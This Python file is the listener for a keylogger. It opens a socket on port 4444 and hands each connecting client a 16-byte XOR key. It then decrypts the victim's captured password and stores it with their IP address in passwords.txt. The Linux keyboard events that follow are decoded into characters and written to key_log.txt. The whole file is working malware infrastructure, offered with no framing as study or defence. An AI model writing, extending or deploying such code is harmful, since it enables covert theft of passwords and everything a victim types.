import socket
import struct
import secrets

# US keyboard layout
KEY_MAP = ["RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
           "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER\n", "L_CTRL",
           "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x",
           "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", " ", "CAPS_LOCK"]

FORMAT = 'qqHHi' # 8+8+2+2+4 = 24 byte (standard Linux 64bit)
EVENT_SIZE = struct.calcsize(FORMAT)

def decrypt(data, key):
    return bytearray(data[i] ^ key[i % 16] for i in range(len(data)))

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    print("[*] Server listening... Ready for handshake.")

    while True:
        conn, addr = server.accept()
        print(f"\n[*] Connection active: {addr}")

        # 1. Handshake: Sending key
        session_key = secrets.token_bytes(16)
        conn.send(session_key)
        print(f"[*] Key transmitted: {session_key.hex()}")

        try:
            # 2. Receiving PASSWORD (first packet)
            # Read an initial buffer. Client C sends the password XOR
            raw_password = conn.recv(1024)
            if raw_password:
                decrypted_pass = decrypt(raw_password, session_key).decode('utf-8', errors='ignore')
                print(f"[!] PASSWORD: {decrypted_pass}")
                with open("passwords.txt", "a") as f:
                    f.write(f"IP: {addr[0]} - PASS: {decrypted_pass}\n")

            print("[*] IStarting key logging...")

            # 3. Receiving KEYS (infinite loop)
            while True:
                data = b""
                while len(data) < EVENT_SIZE:
                    packet = conn.recv(EVENT_SIZE - len(data))
                    if not packet: break
                    data += packet
                
                if not data or len(data) < EVENT_SIZE: break
                
                decrypted = decrypt(data, session_key)
                
                try:
                    # Unpack Linux event
                    _, _, ev_type, code, value = struct.unpack(FORMAT, bytes(decrypted))
                    
                    # ev_type 1 = EV_KEY, value 1 = KeyDown
                    if ev_type == 1 and value == 1:
                        char = KEY_MAP[code] if code < len(KEY_MAP) else f"[{code}]"
                        print(char, end="", flush=True)
                        with open("key_log.txt", "a") as f:
                            f.write(char)
                except Exception:
                    continue
                        
        except (ConnectionResetError, BrokenPipeError):
            print(f"\n[!] Connection lost with {addr}")
        finally:
            conn.close()

if __name__ == "__main__":
    start_server()